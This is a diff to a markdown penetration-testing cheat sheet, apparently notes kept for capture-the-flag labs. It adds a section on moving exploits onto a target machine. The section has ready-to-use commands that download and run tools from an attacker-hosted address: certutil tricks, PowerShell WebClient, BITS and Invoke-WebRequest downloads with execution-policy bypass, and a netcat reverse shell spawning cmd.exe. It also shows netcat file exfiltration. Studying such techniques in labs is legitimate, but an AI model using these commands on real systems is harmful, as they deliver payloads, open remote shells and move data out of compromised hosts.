@@ -32,7 +32,55 @@ http://www.insidepro.com/eng/download.shtml
 **netcat:**
 
 	nc -lvnp [port]
+	
+## Transferring Exploits:
 
+**Python3 Simple HTTP Server:**
+
+    	python3 -m http.server 80		(Specific to current direct ran from)
+	or if python3 is default in path:
+	python -m http.server 80
+	
+	hosted @ http://[attackbox IP]
+	
+**wget:**
+
+	wget http://[IP attack box][:port]/[File name]
+	
+
+**CertUtil.exe:**
+
+	certutil -urlcache -split -f [URL] [Filename.Extension]
+	certutil -urlcache -split -f http://[IP] nc.exe
+	
+	certutil.exe -encode [inputFileName] [encodedOutputFileName]
+	certutil.exe -urlcache -split -f "http://[Attack box IP]/nc.txt" nc.txt
+	certutil.exe -decode nc.txt nc.exe
+	nc.exe [Attack box IP] 5555 -e cmd.exe
+	
+**VBScript file downloader:**
+
+	echo [script code] > httpdownload.vbs
+	echo [script code] >> httpdownload.vbs
+	
+**PowerShell Downloads:**
+
+	echo $webclient = New-Object System.Net.WebClient > httpdownload.ps1
+	echo $webclient.DownloadFile("[Download URL]","[File Name]") >> httpdownload.ps1
+	powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File httpdownload.ps1
+	
+	powershell -c "(new-object System.Net.WebClient).DownloadFile('[Download URL]','[File Name]')"
+	powershell -c "(new-object System.Net.WebClient).DownloadFile('http://172.16.3.1/nc.exe','nc.exe')"
+	
+	powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://[IP Attack box]/nc.exe -Destination C:\
+	
+	powershell Invoke-WebRequest -Uri http://[IP Attack box]/nc.exe -OutFile C:\nc.exe
+	
+**Netcat File Transfers:**
+
+	nc -lvp 8080 > /root/Desktop/transfer.txt
+	nc 192.168.100.107 8080 < /root/Desktop/transfer.txt
+	
 ## SSH:
     
 ```chmod 600 id_rsa```   
@@ -80,11 +128,6 @@ GTFO Bins (https://gtfobins.github.io/)
         --data specifies POST data
         example: curl http://10.10.75.167:8081/ctf/post -X POST --data flag_please
 	
-**Python3 Simple HTTP Server:**
-
-    	python3 -m http.server 80
-	or if python3 is default in path:
-	python -m http.server 80
     
 ## Linux Priv Esc:
 
